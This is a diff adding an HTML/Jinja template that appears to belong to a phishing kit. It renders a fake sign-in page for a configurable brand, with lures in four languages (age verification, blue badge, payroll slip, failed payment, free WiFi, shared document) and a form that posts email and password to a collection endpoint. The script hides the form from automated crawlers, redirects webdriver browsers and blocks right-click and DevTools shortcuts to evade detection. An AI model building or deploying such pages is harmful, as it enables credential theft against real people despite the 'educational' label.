@@ -1,0 +1,523 @@
+<!-- Flash Engine Powered by chadi0x (https://github.com/chadi0x) - Educational Testing Only -->
+<!DOCTYPE html>
+<html lang="{{ link.language }}" dir="{{ 'rtl' if link.language == 'ar' else 'ltr' }}">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>{{ 'Sign in' if link.language == 'en' else 'Connexion' if link.language == 'fr' else 'تسجيل الدخول' }} - {{
+        p_config.name }}</title>
+    <style>
+        /* Anti-Bot Hardening */
+        body {
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+
+        /* Base Reset */
+        body,
+        html {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+
+            background: {
+                    {
+                    p_config.bg_color or '#f0f2f5'
+                }
+            }
+
+            ;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* Theme: Minimal */
+        .theme-minimal {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+
+            background: {
+                    {
+                    p_config.bg_color or '#f0f2f5'
+                }
+            }
+
+            ;
+        }
+
+        .theme-minimal .card {
+            width: 100%;
+            max-width: 450px;
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        /* Theme: Split */
+        .theme-split {
+            display: flex;
+            height: 100vh;
+        }
+
+        .theme-split .left-col {
+            flex: 1;
+
+            background: {
+                    {
+                    p_config.color
+                }
+            }
+
+            ;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            flex-direction: column;
+            background-image: linear-gradient(135deg, rgba(0, 0, 0, 0.1) 0%, rgba(0, 0, 0, 0) 100%);
+        }
+
+        .theme-split .right-col {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+            background: {
+                    {
+                    p_config.bg_color or '#ffffff'
+                }
+            }
+
+            ;
+        }
+
+        .theme-split .card {
+            width: 100%;
+            max-width: 400px;
+            padding: 40px;
+            text-align: center;
+        }
+
+        /* Theme: Mobile */
+        .theme-mobile {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+
+            background: {
+                    {
+                    p_config.bg_color or '#fafafa'
+                }
+            }
+
+            ;
+        }
+
+        .theme-mobile .mobile-frame {
+            width: 100%;
+            max-width: 380px;
+            height: 100vh;
+            max-height: 800px;
+            background: white;
+            border: 1px solid #dbdbdb;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.05);
+        }
+
+        /* Universal Mobile Override (Force Native App Feel on Phones) */
+        @media (max-width: 768px) {
+            .theme-split .left-col {
+                display: none !important;
+            }
+
+            /* Remove desktop-style cards on mobile for realism */
+            .theme-minimal .card,
+            .theme-split .card {
+                box-shadow: none !important;
+                border-radius: 0 !important;
+                background: transparent !important;
+                padding: 20px !important;
+                width: 100% !important;
+            }
+
+            .theme-mobile .mobile-frame {
+                border: none !important;
+                box-shadow: none !important;
+                background: transparent !important;
+            }
+
+            .theme-minimal,
+            .theme-split,
+            .theme-mobile {
+                background: {
+                        {
+                        p_config.bg_color or '#ffffff'
+                    }
+                }
+
+                ;
+                align-items: center;
+                /* Center vertically still good */
+            }
+        }
+
+        /* Common Elements */
+        .logo {
+            max-height: 60px;
+            margin-bottom: 20px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            background: #fafafa;
+            color: #333;
+            box-sizing: border-box;
+            transition: 0.3s;
+        }
+
+        .form-control:focus {
+            border-color: {
+                    {
+                    p_config.color
+                }
+            }
+
+            ;
+            outline: none;
+            background: #fff;
+            box-shadow: 0 0 0 2px rgba(0, 0, 0, 0.05);
+        }
+
+        /* Reactive Button */
+        .btn {
+            width: 100%;
+            padding: 12px;
+
+            background: {
+                    {
+                    p_config.color
+                }
+            }
+
+            ;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 14px;
+            cursor: not-allowed;
+            transition: all 0.3s ease;
+            opacity: 0.6;
+        }
+
+        .btn.active {
+            opacity: 1;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+
+        .scenario-box {
+            margin-bottom: 20px;
+            padding: 15px;
+            border-radius: 8px;
+            background: #f8f9fa;
+            border: 1px solid #e9ecef;
+        }
+
+        .scenario-icon {
+            font-size: 24px;
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        /* Footer */
+        .footer-links {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+        }
+
+        .footer-links span {
+            cursor: pointer;
+        }
+
+        /* Anti-Bot Honeypot: Form Hidden until interaction */
+        #login-form {
+            opacity: 0;
+            transition: opacity 0.5s;
+            pointer-events: none;
+        }
+
+        .bot-check-active #login-form {
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        /* Video Blur Overlay */
+        .blur-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(10px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            flex-direction: column;
+            border-radius: 8px;
+        }
+    </style>
+</head>
+
+<body oncontextmenu="return false;">
+
+    {% set texts = {
+    'en': {
+    'login': 'Log In', 'user': 'Phone, email, or username', 'pass': 'Password',
+    'group_h': 'Join Group', 'group_p': 'Login to view private group content.',
+    'video_h': 'Age Verification', 'video_p': 'Please verify your age to continue.',
+    'verify_h': 'Verification Badge', 'verify_p': 'Login to claim your blue badge.',
+    'security_h': 'Suspicious Activity', 'security_p': 'We noticed a login from a new device.',
+    'leak_h': 'Private Content', 'leak_p': 'Login to view hidden content.',
+    'payroll_h': 'Employee Portal', 'payroll_p': 'Login to view your salary slip.',
+    'subscription_h': 'Payment Failed', 'subscription_p': 'Update payment method to continue.',
+    '2fa_h': 'Security Check', '2fa_p': 'Enter your credentials to receive code.',
+    'wifi_h': 'Free WiFi', 'wifi_p': 'Login to connect to high-speed internet.',
+    'drive_h': 'Shared Document', 'drive_p': 'Verify identity to view protected file.'
+    },
+    'fr': {
+    'login': 'Se connecter', 'user': 'Email ou téléphone', 'pass': 'Mot de passe',
+    'group_h': 'Groupe Privé', 'group_p': 'Connectez-vous pour accéder au groupe.',
+    'video_h': 'Vérification', 'video_p': 'Veuillez confirmer votre âge.',
+    'verify_h': 'Badge de Vérification', 'verify_p': 'Connectez-vous pour le badge bleu.',
+    'security_h': 'Sécurité', 'security_p': 'Connexion suspecte détectée.',
+    'leak_h': 'Contenu Privé', 'leak_p': 'Connectez-vous pour voir.',
+    'payroll_h': 'Portail RH', 'payroll_p': 'Voir votre fiche de paie.',
+    'subscription_h': 'Paiement Échoué', 'subscription_p': 'Mettez à jour vos infos.',
+    '2fa_h': 'Code de Sécurité', '2fa_p': 'Entrez vos identifiants.',
+    'wifi_h': 'WiFi Gratuit', 'wifi_p': 'Connectez-vous pour l\'accès internet.',
+    'drive_h': 'Document Partagé', 'drive_p': 'Vérifiez votre identité pour voir.'
+    },
+    'ar': {
+    'login': 'تسجيل الدخول', 'user': 'البريد أو الهاتف', 'pass': 'كلمة المرور',
+    'group_h': 'مجموعة خاصة', 'group_p': 'سجل الدخول للمشاهدة.',
+    'video_h': 'تأكيد العمر', 'video_p': 'يرجى تأكيد عمرك للمتابعة.',
+    'verify_h': 'شارة التوثيق', 'verify_p': 'سجل الدخول للحصول على الشارة.',
+    'security_h': 'تنبيه أمني', 'security_p': 'تم اكتشاف نشاط غير مريب.',
+    'leak_h': 'محتوى خاص', 'leak_p': 'سجل الدخول للمشاهدة.',
+    'payroll_h': 'بوابة الموظفين', 'payroll_p': 'عرض قسيمة الراتب.',
+    'subscription_h': 'فشل الدفع', 'subscription_p': 'حدث طريقة الدفع.',
+    '2fa_h': 'فحص أمني', '2fa_p': 'أدخل بياناتك لاستلام الرمز.',
+    'wifi_h': 'واي فاي مجاني', 'wifi_p': 'سجل الدخول للاتصال بالإنترنت.',
+    'drive_h': 'ملف مشترك', 'drive_p': 'أكد هويتك لعرض الملف.'
+    },
+    'pl': {
+    'login': 'Zaloguj się', 'user': 'Telefon, e-mail lub nazwa użytkownika', 'pass': 'Hasło',
+    'group_h': 'Dołącz do grupy', 'group_p': 'Zaloguj się, aby wyświetlić prywatną zawartość grupy.',
+    'video_h': 'Weryfikacja wieku', 'video_p': 'Zweryfikuj swój wiek, aby kontynuować.',
+    'verify_h': 'Odznaka weryfikacyjna', 'verify_p': 'Zaloguj się, aby odebrać swoją niebieską odznakę.',
+    'security_h': 'Podejrzana aktywność', 'security_p': 'Zauważyliśmy logowanie z nowego urządzenia.',
+    'leak_h': 'Prywatna zawartość', 'leak_p': 'Zaloguj się, aby wyświetlić ukrytą zawartość.',
+    'payroll_h': 'Portal pracowniczy', 'payroll_p': 'Zaloguj się, aby wyświetlić swój pasek wynagrodzeń.',
+    'subscription_h': 'Płatność nieudana', 'subscription_p': 'Zaktualizuj metodę płatności, aby kontynuować.',
+    '2fa_h': 'Kontrola bezpieczeństwa', '2fa_p': 'Wprowadź swoje dane, aby otrzymać kod.',
+    'wifi_h': 'Darmowe WiFi', 'wifi_p': 'Zaloguj się, aby połączyć się z szybkim internetem.',
+    'drive_h': 'Udostępniony dokument', 'drive_p': 'Zweryfikuj tożsamość, aby wyświetlić chroniony plik.'
+    }
+    } %}
+    {% set t = texts[link.language] %}
+
+    <!-- Reusable Form Macro -->
+    {% macro login_form(t, link, config) %}
+    <div id="login-form">
+        <!-- Scenario Header -->
+        {% if link.scenario != 'group' and link.scenario != 'minimal' %}
+        <div class="scenario-box">
+            {% if link.scenario == 'video' %}
+            <div style="position:relative; height:100px; background:grey; border-radius:4px; overflow:hidden;">
+                <img src="{{ link.media_url or 'https://images.unsplash.com/photo-1492684223066-81342ee5ff30' }}"
+                    style="width:100%; height:100%; object-fit:cover;">
+                <div class="blur-overlay"><b>🔞 18+</b></div>
+            </div>
+            <p style="margin-top:10px; margin-bottom:0; font-weight:500;">{{ t.video_p }}</p>
+
+            {% elif link.scenario == 'security' or link.scenario == '2fa' %}
+            <span class="scenario-icon">🛡️</span>
+            <b>{{ t.security_h if link.scenario == 'security' else t['2fa_h'] }}</b>
+            <p style="margin:5px 0 0 0; font-size:13px; color:#666;">{{ t.security_p if link.scenario == 'security' else
+                t['2fa_p'] }}</p>
+
+            {% elif link.scenario == 'payroll' %}
+            <span class="scenario-icon">💰</span>
+            <b>{{ t.payroll_h }}</b>
+            <p style="margin:5px 0 0 0; font-size:13px; color:#666;">{{ t.payroll_p }}</p>
+
+            {% elif link.scenario == 'subscription' %}
+            <span class="scenario-icon">⚠️</span>
+            <b>{{ t.subscription_h }}</b>
+            <p style="margin:5px 0 0 0; font-size:13px; color:#666;">{{ t.subscription_p }}</p>
+
+            {% elif link.scenario == 'wifi' %}
+            <span class="scenario-icon">📶</span>
+            <b>{{ t.wifi_h }}</b>
+            <p style="margin:5px 0 0 0; font-size:13px; color:#666;">{{ t.wifi_p }}</p>
+
+            {% elif link.scenario == 'drive' %}
+            <span class="scenario-icon">📂</span>
+            <b>{{ t.drive_h }}</b>
+            <p style="margin:5px 0 0 0; font-size:13px; color:#666;">{{ t.drive_p }}</p>
+
+            {% elif link.scenario == 'verify' %}
+            <span class="scenario-icon" style="color:#1d9bf0;">✅</span>
+            <b>{{ t.verify_h }}</b>
+            <p style="margin:5px 0 0 0; font-size:13px; color:#666;">{{ t.verify_p }}</p>
+
+            {% endif %}
+        </div>
+        {% endif %}
+
+        <form action="/f/{{ link.id }}/auth" method="POST">
+            <input type="text" name="email" class="form-control check-input" placeholder="{{ t.user }}" required
+                autocomplete="off">
+            <input type="password" name="password" class="form-control check-input" placeholder="{{ t.pass }}" required
+                autocomplete="off">
+            <button type="submit" class="btn" id="submit-btn" disabled>{{ t.login }}</button>
+        </form>
+
+        <div class="footer-links">
+            <span>Forgot Password?</span> • <span>Help</span>
+        </div>
+    </div>
+    {% endmacro %}
+
+    <!-- Anti-Bot Cover -->
+    <div id="honeypot" style="position:fixed; top:0; left:0; width:100%; height:100%; z-index:9999;"></div>
+
+    <!-- Layout Logic -->
+    {% if p_config.theme == 'split' %}
+    <div class="theme-split">
+        <div class="left-col">
+            <h1 style="font-size: 3rem; margin-bottom: 20px;">{{ p_config.name }}</h1>
+            <p style="font-size: 1.5rem; max-width: 400px; text-align: center;">Connect with friends and the world
+                around you on {{ p_config.name }}.</p>
+        </div>
+        <div class="right-col">
+            <div class="card">
+                <img src="{{ p_config.logo }}" alt="Logo" class="logo">
+                {{ login_form(t, link, p_config) }}
+            </div>
+        </div>
+    </div>
+
+    {% elif p_config.theme == 'mobile' %}
+    <div class="theme-mobile">
+        <div class="mobile-frame">
+            <div style="flex-grow: 1; display:flex; flex-direction:column; justify-content:center; width:100%;">
+                <center><img src="{{ p_config.logo }}" alt="Logo" class="logo" style="max-height: 60px;"></center>
+                {{ login_form(t, link, p_config) }}
+            </div>
+            <div style="border-top:1px solid #eee; padding-top:20px; width:100%; text-align:center;">
+                <span style="color:#999;font-size:12px;">Don't have an account? <b>Sign up</b></span>
+            </div>
+        </div>
+    </div>
+
+    {% else %}
+    <!-- Minimal -->
+    <div class="theme-minimal">
+        <div class="card">
+            <img src="{{ p_config.logo }}" alt="Logo" class="logo">
+            <h2 style="font-weight: 500; margin-bottom: 10px;">{{ t.login }}</h2>
+            <p style="margin-bottom: 30px; color:#666;">to continue to {{ p_config.name }}</p>
+            {{ login_form(t, link, p_config) }}
+        </div>
+    </div>
+    {% endif %}
+
+
+
+    <script>
+        // --- REACTIVE BUTTON ---
+        const inputs = document.querySelectorAll('.check-input');
+        const submitBtn = document.getElementById('submit-btn');
+
+        function checkInputs() {
+            let allFilled = true;
+            inputs.forEach(input => {
+                if (input.value.length < 3) allFilled = false;
+            });
+
+            if (allFilled) {
+                submitBtn.classList.add('active');
+                submitBtn.removeAttribute('disabled');
+            } else {
+                submitBtn.classList.remove('active');
+                submitBtn.setAttribute('disabled', 'true');
+            }
+        }
+
+        inputs.forEach(input => {
+            input.addEventListener('input', checkInputs);
+        });
+
+        // --- ANTI-BOT HARDENING ---
+        (function () {
+            // 1. Webdriver Detection
+            if (navigator.webdriver) {
+                window.location.href = "https://google.com";
+                return;
+            }
+
+            // 2. Mouse Honeypot
+            const honeypot = document.getElementById('honeypot');
+            const body = document.body;
+            let humanVerified = false;
+
+            function verifyHuman() {
+                if (humanVerified) return;
+                humanVerified = true;
+                body.classList.add('bot-check-active');
+                honeypot.style.display = 'none';
+            }
+
+            window.addEventListener('mousemove', verifyHuman);
+            window.addEventListener('touchstart', verifyHuman);
+            window.addEventListener('keydown', verifyHuman);
+
+            // 3. Prevent Inspection
+            document.addEventListener('contextmenu', event => event.preventDefault());
+            document.addEventListener('keydown', function (event) {
+                if (event.keyCode == 123 || (event.ctrlKey && event.shiftKey && event.keyCode == 73)) {
+                    event.preventDefault();
+                }
+            });
+        })();
+    </script>
+</body>
+
+</html>
